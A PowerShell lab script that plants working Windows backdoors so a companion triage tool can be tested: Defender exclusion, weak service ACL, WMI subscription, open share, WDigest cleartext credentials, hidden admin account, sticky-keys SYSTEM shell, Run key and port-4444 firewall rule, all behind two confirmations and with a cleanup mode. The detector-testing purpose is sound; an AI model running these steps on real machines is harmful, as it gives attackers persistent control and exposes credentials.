<#
.SYNOPSIS
    Plant realistic Windows persistence on a LAB box, so you can prove triage.ps1
    actually finds it.

.DESCRIPTION
    A detector that is quiet on a clean box looks exactly like a detector that is
    broken. The only way to tell them apart is to plant the thing and check that
    it comes back. This plants one fixture per check group in windows\triage.ps1,
    tags every artifact with RT_LAB_PLANT, and can remove all of it again.

    THIS CREATES REAL BACKDOORS. It refuses to run without two independent
    confirmations, on the same reasoning as redteam\atomic.sh:

        $env:CCDC_WIN_LAB = 1
        .\redteam\windows-plant.ps1 -IAcceptThisBoxIsDisposable

    Take a snapshot first. Run -Cleanup when you are done, and then run
    triage.ps1 again to confirm the box came back clean - a cleanup you did not
    verify is a box you no longer know the state of.

.EXAMPLE
    .\redteam\windows-plant.ps1 -IAcceptThisBoxIsDisposable
.EXAMPLE
    .\redteam\windows-plant.ps1 -IAcceptThisBoxIsDisposable -Cleanup
#>
[CmdletBinding()]
param(
    [switch]$IAcceptThisBoxIsDisposable,
    [switch]$Cleanup,
    [string]$Mark = 'RT_LAB_PLANT'
)

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Continue'

# --- the two interlocks ------------------------------------------------------

function Die { param([string]$m) Write-Host ''; Write-Host "  REFUSING: $m" -ForegroundColor Red; Write-Host ''; exit 1 }

if ($env:CCDC_WIN_LAB -ne '1') {
    Die @"
this plants real backdoors, and nothing here is subtle enough to leave on a box
you care about.

  It runs only where the environment has said it is disposable:

      `$env:CCDC_WIN_LAB = 1
      .\redteam\windows-plant.ps1 -IAcceptThisBoxIsDisposable

  Take a snapshot first.
"@
}
if (-not $IAcceptThisBoxIsDisposable) {
    Die "CCDC_WIN_LAB is set, which is one of the two confirmations needed.
  Add -IAcceptThisBoxIsDisposable to confirm this is a lab box."
}
$id = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $id.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Die "needs to run elevated."
}

$stateDir  = 'C:\ProgramData\CCDC\redteam'
$manifest  = Join-Path $stateDir 'planted.txt'
$svcName   = "${Mark}_svc"
$shareName = "${Mark}_share"
$shareDir  = "C:\${Mark}_share"
$dropDir   = "C:\${Mark}_bin"
$userName  = "${Mark}_bd"          # 20-char SAM limit: keep the mark short
$fwRule    = "$Mark inbound"
$wmiName   = "${Mark}_wmi"

New-Item -ItemType Directory -Path $stateDir -Force | Out-Null
function Note { param([string]$m) Write-Host ("  {0}" -f $m) }
function Planted { param([string]$m) Write-Host ("  planted  {0}" -f $m) -ForegroundColor Yellow }
function Removed { param([string]$m) Write-Host ("  removed  {0}" -f $m) -ForegroundColor Green }

# =============================================================================
# CLEANUP
# =============================================================================
if ($Cleanup) {
    Write-Host ''
    Write-Host "  removing everything tagged $Mark" -ForegroundColor Cyan
    Write-Host ''

    try { & sc.exe stop   $svcName 2>&1 | Out-Null } catch { }
    try { & sc.exe delete $svcName 2>&1 | Out-Null; Removed "service $svcName" } catch { }

    foreach ($cls in @('CommandLineEventConsumer','__EventFilter','__FilterToConsumerBinding')) {
        try {
            Get-CimInstance -Namespace 'root/subscription' -ClassName $cls -ErrorAction Stop |
                Where-Object {
                    $n = ''
                    try { if ($_.PSObject.Properties.Name -contains 'Name') { $n = [string]$_.Name } } catch { }
                    # a binding has no Name; match it on the objects it points at
                    if (-not $n) { try { $n = [string]$_.Consumer } catch { } }
                    $n -match [regex]::Escape($Mark)
                } | ForEach-Object { Remove-CimInstance -InputObject $_ -ErrorAction Stop; Removed "$cls $Mark" }
        } catch { }
    }

    try { Remove-SmbShare -Name $shareName -Force -ErrorAction Stop; Removed "share $shareName" } catch { }
    foreach ($d in @($shareDir, $dropDir)) {
        if (Test-Path -LiteralPath $d) { Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue; Removed "directory $d" }
    }

    try { Remove-LocalGroupMember -Group 'Remote Desktop Users' -Member $userName -ErrorAction Stop; Removed "RDP access for $userName" } catch { }
    try { Remove-LocalGroupMember -Group 'Administrators'       -Member $userName -ErrorAction Stop; Removed "admin rights for $userName" } catch { }
    try { Remove-LocalUser -Name $userName -ErrorAction Stop; Removed "account $userName" } catch { }

    try {
        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' `
            -Name UseLogonCredential -Value 0 -Type DWord -ErrorAction Stop
        Removed 'WDigest UseLogonCredential -> 0'
    } catch { }

    $ifeo = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
    if (Test-Path -LiteralPath $ifeo) { Remove-Item -LiteralPath $ifeo -Recurse -Force -ErrorAction SilentlyContinue; Removed 'IFEO debugger on sethc.exe' }

    $runKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    try { Remove-ItemProperty -LiteralPath $runKey -Name $Mark -ErrorAction Stop; Removed "Run key value $Mark" } catch { }

    try { Remove-MpPreference -ExclusionPath $dropDir -ErrorAction Stop; Removed "Defender exclusion $dropDir" } catch { }
    try { Remove-NetFirewallRule -DisplayName $fwRule -ErrorAction Stop; Removed "firewall rule '$fwRule'" } catch { }

    if (Test-Path -LiteralPath $manifest) { Remove-Item -LiteralPath $manifest -Force }
    Write-Host ''
    Write-Host '  now prove it: .\windows\triage.ps1 -Config C:\ProgramData\CCDC\ccdc.env' -ForegroundColor Cyan
    Write-Host '  A cleanup you did not verify is a box you no longer know the state of.'
    Write-Host ''
    exit 0
}

# =============================================================================
# PLANT
# =============================================================================
Write-Host ''
Write-Host "  planting lab fixtures tagged $Mark on $env:COMPUTERNAME" -ForegroundColor Cyan
Write-Host ''
$log = New-Object System.Collections.ArrayList

# 0. the quiet way to disable AV - FIRST, because that is the order an attacker
#    uses it in, and because Defender reacts to everything that follows.
#
#    Add-MpPreference can block for minutes while Defender is busy, and a hang
#    is not something try/catch can rescue: the script simply stops with half
#    the fixtures planted, which then reads as a triage.ps1 that missed them.
#    Measured on the lab box - it stopped here twice. Bound it and carry on.
$mpJob = Start-Job -ScriptBlock { param($d) Add-MpPreference -ExclusionPath $d -ErrorAction Stop } -ArgumentList $dropDir
if (Wait-Job $mpJob -Timeout 45) {
    try { Receive-Job $mpJob -ErrorAction Stop | Out-Null; Planted "Defender exclusion for $dropDir"; [void]$log.Add("mpexclusion=$dropDir") }
    catch { Note "Defender exclusion FAILED: $($_.Exception.Message)" }
} else {
    Note 'Defender exclusion TIMED OUT after 45s (Defender is busy); carrying on without it'
    Stop-Job $mpJob -ErrorAction SilentlyContinue
}
Remove-Job $mpJob -Force -ErrorAction SilentlyContinue

# 1. a service whose ACL lets ordinary users rewrite its binary path ----------
New-Item -ItemType Directory -Path $dropDir -Force | Out-Null
Copy-Item -LiteralPath 'C:\Windows\System32\cmd.exe' -Destination (Join-Path $dropDir 'svc.exe') -Force -ErrorAction SilentlyContinue
& sc.exe create $svcName binPath= "$dropDir\svc.exe" start= demand 2>&1 | Out-Null
# AU = Authenticated Users, granted DC (change config) and WP (stop). This is
# the real shape of the misconfiguration, not an approximation of it.
& sc.exe sdset $svcName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AU)" 2>&1 | Out-Null
Planted "service $svcName with Authenticated Users granted change-config"
[void]$log.Add("service=$svcName")

# 2. a directory service binaries run from, writable by Users -----------------
& icacls.exe $dropDir /grant "BUILTIN\Users:(OI)(CI)M" 2>&1 | Out-Null
Planted "$dropDir writable by BUILTIN\Users"
[void]$log.Add("dir=$dropDir")

# 3. a WMI permanent event subscription ---------------------------------------
# The filter deliberately watches for a process that will never exist, so the
# fixture is structurally identical to the real thing without ever firing.
try {
    $f = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments @{
        Name = $wmiName; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '${Mark}_never.exe'"
    } -ErrorAction Stop
    $c = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments @{
        Name = $wmiName; CommandLineTemplate = "cmd.exe /c echo $Mark"
    } -ErrorAction Stop
    Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments @{
        Filter = $f; Consumer = $c
    } -ErrorAction Stop | Out-Null
    Planted "WMI subscription $wmiName (filter + consumer + binding)"
    [void]$log.Add("wmi=$wmiName")
} catch { Note "WMI subscription FAILED: $($_.Exception.Message)" }

# 4. a share anyone can write to ----------------------------------------------
New-Item -ItemType Directory -Path $shareDir -Force | Out-Null
try {
    New-SmbShare -Name $shareName -Path $shareDir -FullAccess 'Everyone' -ErrorAction Stop | Out-Null
    Planted "share $shareName -> $shareDir, Everyone full access"
    [void]$log.Add("share=$shareName")
} catch { Note "share FAILED: $($_.Exception.Message)" }

# 5. cleartext credentials in memory ------------------------------------------
New-Item -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Force -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name UseLogonCredential -Value 1 -Type DWord
Planted 'WDigest UseLogonCredential=1'
[void]$log.Add('wdigest=1')

# 6. an account that should not be there --------------------------------------
try {
    $pw = ConvertTo-SecureString ('Lab!' + [guid]::NewGuid().ToString('N').Substring(0,12)) -AsPlainText -Force
    New-LocalUser -Name $userName -Password $pw -Description $Mark -ErrorAction Stop | Out-Null
    Add-LocalGroupMember -Group 'Administrators'       -Member $userName -ErrorAction SilentlyContinue
    Add-LocalGroupMember -Group 'Remote Desktop Users' -Member $userName -ErrorAction SilentlyContinue
    Planted "$userName, in Administrators and Remote Desktop Users"
    [void]$log.Add("user=$userName")
} catch { Note "account FAILED: $($_.Exception.Message)" }

# 7. a SYSTEM shell from the lock screen --------------------------------------
$ifeo = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
New-Item -Path $ifeo -Force | Out-Null
Set-ItemProperty -Path $ifeo -Name 'Debugger' -Value 'C:\Windows\System32\cmd.exe'
Planted 'IFEO debugger on sethc.exe (five shifts at the lock screen = SYSTEM)'
[void]$log.Add('ifeo=sethc.exe')

# 8. an autostart ---------------------------------------------------------------
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $Mark -Value "$dropDir\svc.exe"
Planted "Run key value $Mark"
[void]$log.Add("runkey=$Mark")

# 9. a hand-made inbound allow rule ---------------------------------------------
try {
    New-NetFirewallRule -DisplayName $fwRule -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow -ErrorAction Stop | Out-Null
    Planted "inbound allow tcp/4444 '$fwRule'"
    [void]$log.Add("fwrule=$fwRule")
} catch { Note "firewall rule FAILED: $($_.Exception.Message)" }

$log | Set-Content -LiteralPath $manifest -Encoding Ascii

# Verify rather than assume. Defender is running on most boxes and removes some
# of these the moment they are written - an IFEO debugger on sethc.exe gets
# pulled within seconds as Behavior:Win32/AccessibilityEscalation. A fixture
# that is gone must say so, or the triage run that follows looks like a missed
# detection when it is actually a fixture that never survived.
Start-Sleep -Seconds 3
Write-Host ''
Write-Host '  verifying what actually survived:'
$survived = 0; $eaten = @()
function Check-Fixture {
    param([string]$Name, [scriptblock]$Test)
    $ok = $false
    try { $ok = [bool](& $Test) } catch { $ok = $false }
    if ($ok) { Write-Host ("    still there  {0}" -f $Name) -ForegroundColor Green; $script:survived++ }
    else     { Write-Host ("    GONE         {0}" -f $Name) -ForegroundColor Red; $script:eaten += $Name }
}
Check-Fixture "service $svcName"          { (& sc.exe query $svcName 2>&1) -match 'SERVICE_NAME' }
Check-Fixture "writable dir $dropDir"     { Test-Path -LiteralPath $dropDir }
Check-Fixture "WMI consumer $wmiName"     { @(Get-CimInstance -Namespace 'root/subscription' -ClassName CommandLineEventConsumer -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq $wmiName }).Count -gt 0 }
Check-Fixture "share $shareName"          { $null -ne (Get-SmbShare -Name $shareName -ErrorAction SilentlyContinue) }
Check-Fixture 'WDigest UseLogonCredential' { 1 -eq (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name UseLogonCredential -ErrorAction SilentlyContinue).UseLogonCredential }
Check-Fixture "account $userName"         { $null -ne (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue) }
Check-Fixture 'IFEO debugger on sethc.exe' { $null -ne (Get-ItemProperty $ifeo -Name Debugger -ErrorAction SilentlyContinue).Debugger }
Check-Fixture "Run key value $Mark"       { $null -ne (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $Mark -ErrorAction SilentlyContinue).$Mark }
Check-Fixture "Defender exclusion"        { @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath) -contains $dropDir }
Check-Fixture "firewall rule '$fwRule'"   { $null -ne (Get-NetFirewallRule -DisplayName $fwRule -ErrorAction SilentlyContinue) }

if (@($eaten).Count -gt 0) {
    Write-Host ''
    Write-Host '  Some fixtures did not survive. That is usually Defender removing them in' -ForegroundColor Yellow
    Write-Host '  real time, which is Defender working - not a bug. Check what it caught:' -ForegroundColor Yellow
    Write-Host '      Get-MpThreat | Format-Table ThreatName,SeverityID'
    Write-Host '      Get-MpThreatDetection | Select-Object -First 5 InitialDetectionTime,Resources | Format-List'
    Write-Host '  Do NOT read a missing fixture as a missed detection in triage.ps1.' -ForegroundColor Yellow
}

Write-Host ''
Write-Host "  $(@($log).Count) fixture(s) attempted, $survived surviving. Manifest: $manifest"
Write-Host ''
Write-Host '  now run:   .\windows\triage.ps1 -Config C:\ProgramData\CCDC\ccdc.env' -ForegroundColor Cyan
Write-Host '  then:      .\redteam\windows-plant.ps1 -IAcceptThisBoxIsDisposable -Cleanup'
Write-Host ''
